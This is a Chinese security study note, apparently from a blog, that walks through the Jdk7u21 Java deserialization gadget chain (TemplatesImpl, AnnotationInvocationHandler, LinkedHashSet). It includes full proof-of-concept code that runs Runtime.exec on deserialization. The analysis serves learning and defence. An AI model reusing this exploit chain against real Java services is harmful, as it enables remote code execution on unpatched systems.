---
description: JAVA动态编程+动态代理+TemplatesImpl+AnnotationInvocationHandler+LinkedHashSet
---

# Java反序列化之Jdk7u21

以下内容引自CSDN「**b1ngz**」在其「[Java反序列 Jdk7u21 Payload 学习笔记](https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/)」的博文，具体内容已经是精简后的版本：

## Java反序列 Jdk7u21 Payload 学习笔记

 Friday. April 13, 2018 - 22 mins

Update

* 2020-02-20: Fix `AnnotationInvocationHandler` mitigation mistake in Part `0x03 修复方案`

## 0x00 简介 <a id="0x00-&#x7B80;&#x4ECB;"></a>

最近在看 Java 反序列化的一些东西，在学习 [ysoserial](https://github.com/frohoff/ysoserial) 的代码时，看到 payload list 中有一个比较特殊的 [Jdk7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3)，该 payload 不依赖第三方库，只需 JRE 即可完成攻击，影响 JRE versions &lt;= 7u21 的版本。在学习的过程中，觉得很有意思，这里记录一下的过程，如果有什么地方写的不准确或错误，欢迎指出

文章中的代码运行环境为 JDK **7u21**

## 0x01 知识点 <a id="0x01-&#x77E5;&#x8BC6;&#x70B9;"></a>

在分析代码之前，我们先来了解一些相关知识，有助于后续理解

### javassist <a id="javassist"></a>

[javassist](https://github.com/jboss-javassist/javassist): Java字节码操作库，提供了在运行时操作Java字节码的方法，如在已有 Class 中动态修改和插入Java代码，示例：在 Cat 类中添加包含恶意代码的 static block

```java
public class Cat {}

@Test
public void test() throws Exception {
  ClassPool pool = ClassPool.getDefault();
  CtClass cc = pool.get(Cat.class.getName());
  String cmd = "System.out.println(\"evil code\");";
  // 创建 static 代码块，并插入代码
  cc.makeClassInitializer().insertBefore(cmd);
  String randomClassName = "EvilCat" + System.nanoTime();
  cc.setName(randomClassName);
  // 写入.class 文件
  cc.writeFile();
}
```

生成的 .class，反编译后的源码如下：

```java
public class EvilCat1522165524449145000 {
    public EvilCat1522165524449145000() {
    }

    static {
        System.out.println("evil code");
    }
}
```

除了 static block，也可以在 constructor 或其他方法中添加代码。 关于 javassist 的详细介绍可以参考 http://www.cnblogs.com/hucn/p/3636912.html

在 Jdk7u21 的 payload 中，使用了 javassist 来构造包含恶意代码的class

### Java static initializer <a id="java-static-initializer"></a>

Java Class 中定义的 static 代码块被称为 [static initializer](http://docs.oracle.com/javase/specs/jls/se7/html/jls-8.html#jls-8.7)，在 class 初始化 \(initialized\) 时会执行该语句块

```java
public class StaticInitializerTest {
    static {
        System.out.println("static initializer");
    }  
    public StaticInitializerTest() {
        System.out.println("constructor executed");
    }
}
```

对于 “class 初始化”，听起来比较抽象，这里通过代码来说明一下：

```java
@Test
public void testStaticBlock() throws Exception {
    // 内部调用 loadClass(name, false) 不会 initialize class，无 print
    JavassistTests.class.getClassLoader().loadClass("com.b1ngz.jdk7u21.StaticInitializerTest");
    // 反射加载，会 initialize class，print static initializer
    Class.forName("com.b1ngz.jdk7u21.StaticInitializerTest");
    // 实例化，先打印 static initializer，再打印 constructor executed
    Assert.assertNotNull(StaticInitializerTest.class.newInstance());
    // 实例化，先打印 static initializer，再打印 constructor executed
    Assert.assertNotNull(new StaticInitializerTest());
}

@Test
public void testDefineClass() throws Exception {
    ClassPool pool = ClassPool.getDefault();
    CtClass cc = pool.get(StaticInitializerTest.class.getName());
    // avoid duplicate class definition
    String randomClassName = "EvilCat" + System.nanoTime();
    cc.setName(randomClassName);
    byte[] byteCodes = cc.toBytecode();
    // protected method, use reflect
    Method method = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
    method.setAccessible(true);
    // 不会 initialize class，无 print
    method.invoke(JavassistTests.class.getClassLoader(), new Object[]{(String) null, byteCodes, 0, byteCodes.length});
}
```

这里需要重点关注一下 `ClassLoader.defineClass()` 方法运行后，**并不会执行 static block**，而 `Class.newInstance()` 会执行，这两个地方会涉及到 Jdk7u21 payload 恶意代码的具体执行点

关于 `Class.forName("SomeClass");` 和 `ClassLoader.loadClass("SomeClass");` ，有兴趣的可以参考 https://stackoverflow.com/a/8100407/6467552

### “f5a5a608”的hashCode为0 <a id="f5a5a608&#x7684;hashcode&#x4E3A;0"></a>

Java Object 中定义了 `hashCode()` 方法，返回一个 hash 值，当两个对象 equals 时，hashCode 需要相同

String 类重写了该方法

```java
public int hashCode() {
        int h = hash;
        if (h == 0 && count > 0) {
            int off = offset;
            char val[] = value;
            int len = count;

            for (int i = 0; i < len; i++) {
                h = 31*h + val[off++];
            }
            hash = h;
        }
        return h;
    }
```

有一个特殊的字符串 `"f5a5a608"` ，hashCode 的值为 0，在构造 Jdk7u21 payload 的过程中利用到了这一点

```java
// print 0
System.out.println("f5a5a608".hashCode());
```

### Dynamic Proxy <a id="dynamic-proxy"></a>

在 ysoserial 的代码中，大量使用了到动态代理机制来构造 payload，我们来简单了解一下

当需要增加或者修改某些已存在class的功能时，会使用动态代理机制，通过创建 proxy object 来代理实际的对象 。主要涉及接口为 `InvocationHandler`

```java
public interface InvocationHandler {
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable;
}
```

接口中只定义了一个方法 `invoke()`，所有 proxy object 的方法调用都会转换为调用 `invoke()` 方法，调用方法和参数通过 `method` 和 `args` 来传递

来看一个代理 Map 接口的例子，会在所有方法的执行之前打印 start 、执行完成后打印 finish

```java
public class InvocationHandlerTests {
    @Test
    public void testInvocationHandler() throws Exception {
        // 被代理的对象
        Map map = new HashMap();
        // JDK 本身只支持动态代理接口
        // 创建 proxy object，参数为 ClassLoader、要代理的接口Class array、实际处理方法调用的 InvocationHandler
        Map proxy = (Map) Proxy.newProxyInstance(InvocationHandlerTests.class.getClassLoader(), new Class[]{Map.class}, new MyInvocationHandler(map));
        proxy.put("key", "value");
        proxy.get("key");
    }

    public static class MyInvocationHandler implements InvocationHandler {
        private Map map;

        public MyInvocationHandler(Map map) {
            this.map = map;
        }

        // 实际的方法调用都会变成调用 invoke 方法
        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
            System.out.println("method: " + method.getName() + " start");
            Object result = method.invoke(map, args);
            System.out.println("method: " + method.getName() + " finish");
            return result;
        }
    }
}
```

## 0x02 Payload分析 & 构造 <a id="0x02-payload&#x5206;&#x6790;--&#x6784;&#x9020;"></a>

### TemplatesImpl <a id="templatesimpl"></a>

在利用 payload 中，TemplatesImpl 类主要的作用为：

* 使用 `_bytecodes` 成员变量存储恶意字节码 \( 恶意class =&gt; byte array \)
* 提供加载恶意字节码并触发执行的函数，加载在 `defineTransletClasses()` 方法中，方法触发为 `getOutputProperties()` 或 `newTransformer()`

我们来具体看一下，该类位于 `com.sun.org.apache.xalan.internal.xsltc.trax` 包中，用于 xml document 的处理和转换，定义如下

```text
import javax.xml.transform.Templates;
import java.io.Serializable;
...
public final class TemplatesImpl implements Templates, Serializable {
    ...
}
```

`TemplatesImpl` 类实现了 `Templates` 和 `Serializable` 两个接口

其中 `Templates` 接口定义如下，包含了两个方法，**即之前提到触发恶意代码执行所的方法**

```text
public interface Templates {
    Transformer newTransformer() throws TransformerConfigurationException;
    Properties getOutputProperties();
}
```

在 `TemplatesImpl` 类中有一个 private 方法 `defineTransletClasses()`，精简后的代码如下

```text
private byte[][] _bytecodes = null;
...
private void defineTransletClasses()
        throws TransformerConfigurationException {
        ...
        TransletClassLoader loader = ...
        try {
            for (int i = 0; i < classCount; i++) {
                // 调用 ClassLoader.defineClass() 方法加载 Class 
                _class[i] = loader.defineClass(_bytecodes[i]);
                final Class superClass = _class[i].getSuperclass();

                if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                    _transletIndex = i;
                } else {
                    _auxClasses.put(_class[i].getName(), _class[i]);
                }
            }
        }
}
```

在方法中，调用了 `ClassLoader.defineClass()` 方法，参数为实例变量 `_bytecodes` 内的元素，该方法会将字节数组转换为 Class，并加载

也就是说，通过设置 `_bytecodes` 的内容 ，调用 `defineTransletClasses()` 方法即可加载指定的 Class。

在代码中，一共有三个地方调用了这个方法

* getTransletClasses\(\)
* getTransletIndex\(\)
* getTransletInstance\(\)

在 **Java static initializer** 部分提到 `ClassLoader.defineClass()` 并不会执行 static 代码块，所以前两个方法不满足条件，再看一下 `getTransletInstance()` 方法

```text
   private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            if (_name == null) return null;

            if (_class == null) defineTransletClasses();
            
            // 创建实例
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
            ...
        }
    }
```

`defineTransletClasses()` 执行后，会调用之前加载的 Class 的 `newInstance()` 方法来创建实例，触发 static block 和 constructor 的执行，根据方法调用关系

```text
getOutputProperties() => newTransformer() => getTransletInstance() => defineTransletClasses() => ClassLoader.defineClass()
```

可以看到调用 `getOutputProperties()` 或 `newTransformer()` 方法均可触发恶意代码的执行

理一下思路

* 使用 `javassist` 库创建一个包含恶意代码的 class，恶意代码可以在 static block中，或在无参构造函数里
* 将恶意 class 的的字节码添加到 TemplatesImpl 实例的 `_bytecodes` 变量中
* 调用实例的 `getOutputProperties()` 或 `newTransformer()` 方法触发恶意代码执行

弹出计算器的代码示例如下 \(程序报错可以忽略\)

```text
    @Test
    public void testTemplatesImpl() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.get(Cat.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open -a /Applications/Calculator.app\");";
        // 创建 static 代码块，并插入恶意代码
        cc.makeClassInitializer().insertBefore(cmd);
        // 使用构造方法也可以
        //CtConstructor constructor = cc.getDeclaredConstructor(new CtClass[]{});
        //constructor.insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        // 为了使 _transletIndex 正确，并执行 newInstance()，具体可查看 defineTransletClasses 方法
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        // 获取字节码
        byte[] evilByteCodes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{evilByteCodes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", targetByteCodes);
        // 进入 defineTransletClasses() 方法需要的条件
        setFieldValue(templates, "_name", "name" + System.nanoTime());
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        templates.newTransformer();
    }
```

在上面的代码示例中，是手动调用 `newTransformer()` 来触发恶意代码的执行，因此还需要找到一个能够在反序列化过程中，自动调用 \(直接或间接\) 该方法的类

### AnnotationInvocationHandler <a id="annotationinvocationhandler"></a>

在构造 payload 中，利用了 `AnnotationInvocationHandler` 提供的 `equals` 方法的默认实现，来触发对 `Tempaltes` 接口中 `getOutputProperties()` 或 `newTransformer()` 的调用，来具体看一下

AnnotationInvocationHandler 位于 `sun.reflect.annotation` 包中，用于 Annotation 的动态代理，其定义如下

```text
class AnnotationInvocationHandler implements InvocationHandler, Serializable {
    private final Class extends Annotation> type;
    private final Map<String, Object> memberValues;

    AnnotationInvocationHandler(Class extends Annotation> type, Map<String, Object> memberValues) {
        // Annotation Class type，eg. Override.class
        this.type = type;
        this.memberValues = memberValues;
    }
  ...
}    
```

可以看到实现了 `InvocationHandler` 和 `Serializable` 两个接口，根据 **Dynamic Proxy** 部分的介绍，使用 AnnotationInvocationHandler 创建的 proxy object 的所有方法调用都会变成对 invoke 方法的调用，来看一下方法的实现

```text
 public Object invoke(Object proxy, Method method, Object[] args) {
        String member = method.getName();
        Class[] paramTypes = method.getParameterTypes();

        // Handle Object and Annotation methods
        if (member.equals("equals") && paramTypes.length == 1 &&
            paramTypes[0] == Object.class)
            return equalsImpl(args[0]);
        ...
    }
```

可以看到当调用方法名为`equals` 时，且参数个数和类型匹配，则调用内部 `equalsImpl` 方法

跟入后可以看到，首先获取 `type` Class 所有声明的方法，然后在参数 Object o 上使用反射调用方法，因此前面所说 **TemplatesImpl** 实例是需要作为参数传入

```text
     private Boolean equalsImpl(Object o) {
        // o 需要为 type 的实例
        if (!this.type.isInstance(o)) {
            return false;
        } 
        ...
        // 获取到 type Class 的方法
        for (Method memberMethod : getMemberMethods()) {
            ...
            AnnotationInvocationHandler hisHandler = asOneOfUs(o);
            if (hisHandler != null) {
                hisValue = hisHandler.memberValues.get(member);
            } else {
                // 反射调用方法
                hisValue = memberMethod.invoke(o);
            }
        }
        return true;
    }
```

理一下思路

1. 根据 **TemplatesImpl** 部分的说明，创建一个包含恶意代码的 TemplatesImpl 实例 `evilTemplates`
2. 使用 AnnotationInvocationHandler 创建 proxy object 代理 Templates 接口 \(会使用到反射\)
3. 调用 proxy object 的 `equals` 方法，将 `evilTemplates` 作为参数

示例代码如下，运行即可弹出计算器

```text
    @Test
    public void testTemplateImpl() throws Exception {
        Map map = new HashMap();
        //  AnnotationInvocationHandler 构造方法为 package private，需要使用反射创建实例
        final Constructor ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        // 构造 payload 时，因为新版 jdk 对 type 参数做了校验，必须为 Annotation
        // 为了不报错，所以设置为任意一个 Annotation，再用反射修改 type 参数
        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class, map);
        // 反射设置属性值
        setFieldValue(invocationHandler, "type", Templates.class);
        // 代理 Tempaltes 接口
        Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]{Templates.class}, invocationHandler);
        // 获取包含恶意代码的 Templates 对象
        Templates evilTemplates = getEvilTemplates();
        // 触发恶意代码执行
        proxy.equals(evilTemplates);
    }
```

这里结合了 `TemplatesImpl` 和 `AnnotationInvocationHandler` ，将包含恶意代码的 Templates 对象作为参数，手动调用 `equals` 方法来触发代码执行，所以还是需要再找到一个能够在反序列化过程中，满足这一条件的场景，我们来继续看第三个关键的类

### LinkedHashSet <a id="linkedhashset"></a>

在利用 payload 中，LinkedHashSet 是最外层的类，包含恶意代码的实例和proxy object 会作为元素添加到 set 中，在反序列化过程中，会调用到前一部分所说的 `equals` 方法，来具体看一下

LinkedHashSet 位于 `java.util` 包中，是 HashSet 的子类，添加到 set 的元素会保持有序状态，**内部实现基于 HashMap**

```text
public class LinkedHashSet<E>
    extends HashSet<E>
    implements Set<E>, Cloneable, java.io.Serializable {
}
```

在 HashSet 的 `writeObject()` 方法中，会依次调用每个元素的 `writeObject()` 方法来实现序列化

```text
private void writeObject(java.io.ObjectOutputStream s)
        throws java.io.IOException {
        ....
        // Write out all elements in the proper order.
        for (E e : map.keySet())
            s.writeObject(e);
    }
```

相应的，在反序列化过程中，会依次调用每个元素的 `readObject()` 方法，然后将其作为 `key` \(value 为固定值\) 依次放入 HashMap 中

```text
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        ...
        // Read in all elements in the proper order.
        for (int i=0; i<size; i++) {
            E e = (E) s.readObject();
            map.put(e, PRESENT);
        }
    }
```

来看一下 `HashMap` 的 `put()` 方法，首先会调用内部 `hash()` 函数计算 key 的 hash 值，然后遍历所有元素，\*\*当要插入的元素的 hash 和已有 entry 相同，且 key 和 Entry的 key 指向同一个对象 或 二者equals时 \*\*，则认为 key 是否已经存在，返回 oldValue，否则调用 `addEntry()` 添加元素

```text
    public V put(K key, V value) {
        if (key == null)
            return putForNullKey(value);
        // 计算 key 的 hash 值
        int hash = hash(key);
        int i = indexFor(hash, table.length);
        // 遍历已有元素，检查 key 是否已经存在
        for (Entry<K,V> e = table[i]; e != null; e = e.next) {
            Object k;
            // hash 值相同，且key和Entry的key指向同一个对象 或 二者equals
            if (e.hash == hash && ((k = e.key) == key || key.equals(k))) {
                V oldValue = e.value;
                e.value = value;
                e.recordAccess(this);
                return oldValue;
            }
        }

        modCount++;
        addEntry(hash, key, value, i);
        return null;
    }
```

**代码中将已有元素的** _**key**_ **值作为参数 \(k 变量\)，调用了插入 key 的 `equals` 方法来判断而这是否相等**，这里我们只要反序列化过程中让 proxy object 先添加，然后再添加包含恶意代码的实例 \(序列化时添加要顺序相反\)，正好是我们在 [AnnotationInvocationHandler]() 小节最后，提到的部分

理一下思路

* 创建一个 LinkedHashSet
* 先将 包含恶意代码的 Templates 对象添加到 hashSet 中
* 将使用 AnnotationInvocationHandler 创建的proxy object \(代理 Templaes 接口\) 添加到 hashSet 中，在反序列化过程中，会调用 proxy 的 equals 方法 \(包含恶意代码的Templates 对象作为参数\)，触发恶意代码执行

在反序列化过程中，需要保证 HashSet 内的 entry 保持有序，这也是为什么使用 `LinkedHashSet` 的原因

根据代码分析，在执行到 `equals()` 之前，需要满足两个条件

1. e.hash == hash
2. \(k = e.key\) != key

条件 2 比较两个变量是否指向同一个对象，这里满足\(一个为包含恶意代码的templates 实例，一个为proxy object\)，条件1判断的是 hash 值是否相等，来看一下 hash 值是如何计算的

```text
final int hash(Object k) {
  int h = 0;
  ...
    // 调用了 k 的 hashCode
    h ^= k.hashCode();

  h ^= (h >>> 20) ^ (h >>> 12);
  return h ^ (h >>> 7) ^ (h >>> 4);
}
```

可以看到，计算结果只受 `k.hashCode()` 的影响

* **对于普通对象，返回的是就是 `k.hashCode()`**
* 对用 proxy object，因为会统一调用 `inove()` ，而`AnnotationInvocationHandler` 在 `inove()` 方法中提供了 `hashCode()` 的实现，代码如下，内部调用了 `hashCodeImpl()`

```text
public Object invoke(Object obj, Method method, Object[] args) {
  String methodName = method.getName();
    ...
  } else if (methodName.equals("hashCode")) {
    return this.hashCodeImpl();
  }
  ...
}
```

`hashCodeImpl()` 代码如下 ，这里稍微修改了下代码，便于理解

```text
private int hashCodeImpl() {
  int result = 0;
  // 遍历 memberValues
  Iterator itr = this.memberValues.entrySet().iterator();
  for( ;itr.hasNext(); ) {
      Entry entry = (Entry)itr.next();
      String key = ((String)entry.getKey());
      Object value = entry.getValue();
      // 127 * key 的 hashCode，再和 memberValueHashCode(value) 进行异或
      result += 127 * key.hashCode() ^ memberValueHashCode(value);
  }
  return result;
}
```

for 循环内调用了 `memberValueHashCode()` 函数，其精简代码如下

```text
private static int memberValueHashCode(Object var0) {
        Class var1 = var0.getClass();
        if (!var1.isArray()) { // 匹配到该条件
            return var0.hashCode();
        } else if (var1 == byte[].class) {
            ....
        } else {
            ...
        }
}
```

如果 Entry 的 value 的 Class 不为 Array，则 `memberValueHashCode()` 函数返回 `value.hashCode()`，在这里相当于

```text
127 * key.hashCode() ^ value.hashCode();
```

为了让最后返回的 `result` 和 `value.hashCode()` 相同，这就要求

* `memberValues` 仅有一个 entry，否则 for 循环内每次计算的结果会累加
*  `key.hashCode()` 的值为0，从而 127 \* key.hashCode\(\) = 0，0 和 任何数异或还是原值
* value 和 之前添加到 hashset 的对象相同， \(利用代码中该值为包含恶意代码的 templates 对象\)

前面提到字符串 `f5a5a608` 的 hashCode 为 0，所以这里只要让 `AnnotationInvocationHandler` 的 `memberValues` 内只放一个 key 为字符串 `f5a5a608`，value 为包含恶意代码的 `templates` 对象即可

到这里，就可以写出完整的利用代码

```text
    @Test
    public void testPoc() throws Exception {
        Map map = new HashMap();
        String magicStr = "f5a5a608";
        final Constructor ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class, map);
        setFieldValue(invocationHandler, "type", Templates.class);
        // value 先放入任意值，让 HashSet.add(proxy) 成功
        map.put(magicStr, "foo");
        Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]{Templates.class}, invocationHandler);
        Templates evilTemplates = getEvilTemplates();
        HashSet target = new LinkedHashSet();
        target.add(evilTemplates);
        target.add(proxy);
        // 放入实际的 value
        map.put(magicStr, evilTemplates);

        String filename = "/tmp/jdk7u21";
        // 序列化
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filename));
        oos.writeObject(target);
        // 反序列化, boom
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
}
```

反序列化过程的方法调用链如下

```text
LinkedHashSet.readObject()
  LinkedHashSet.add()
    ...
      TemplatesImpl.hashCode() (X)
  LinkedHashSet.add()
    ...
      Proxy(Templates).hashCode() (X)
        AnnotationInvocationHandler.invoke() (X)
          AnnotationInvocationHandler.hashCodeImpl() (X)
            String.hashCode() (0)
            AnnotationInvocationHandler.memberValueHashCode() (X)
              TemplatesImpl.hashCode() (X)
      Proxy(Templates).equals()
        AnnotationInvocationHandler.invoke()
          AnnotationInvocationHandler.equalsImpl()
            Method.invoke()
              ...
                 // TemplatesImpl.getOutputProperties()，实际测试时会直接调用 newTransformer()
                  TemplatesImpl.newTransformer()
                    TemplatesImpl.getTransletInstance()
                      TemplatesImpl.defineTransletClasses()
                        ClassLoader.defineClass()
                        Class.newInstance()
                          ...
                            MaliciousClass.<clinit>()
                              ...
                                Runtime.exec()
```

完整的代码，可以参考 [ysoserial](https://github.com/frohoff/ysoserial) 的 Class Jdk7u21 的代码

## 0x 03 修复方案 <a id="0x-03-&#x4FEE;&#x590D;&#x65B9;&#x6848;"></a>

2020-02-20 Update

在 jdk &gt; 7u21 的版本，修复了这个漏洞，看了下 7u79 的代码，`AnnotationInvocationHandler` 的 `readObject()` 方法增加了异常抛出，导致反序列化失败

![](../../../.gitbook/assets/image%20%2825%29.png)

## 0x 04 参考资料 <a id="0x-04-&#x53C2;&#x8003;&#x8D44;&#x6599;"></a>

* [Java 7u21 Security Advisory](https://gist.github.com/frohoff/24af7913611f8406eaf3#deserialization-call-tree-approximate)
* [java反序列化工具ysoserial分析](http://drops.xmd5.com/static/drops/papers-14317.html)
* [Java动态编程初探——Javassist](http://www.cnblogs.com/hucn/p/3636912.html)

**Related Posts**

* [Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记](https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/)
* [Java 反序列化 ysoserial Spring](https://b1ngz.github.io/java-ysoserial-spring/)
* [Java Dynamic Proxy](https://b1ngz.github.io/java-dynamic-proxy/)
* [Java Reflection](https://b1ngz.github.io/java-reflection/)
* [Java 反序列化 ysoserial JRMPListener](https://b1ngz.github.io/java-ysoserial-jrmplistener/)

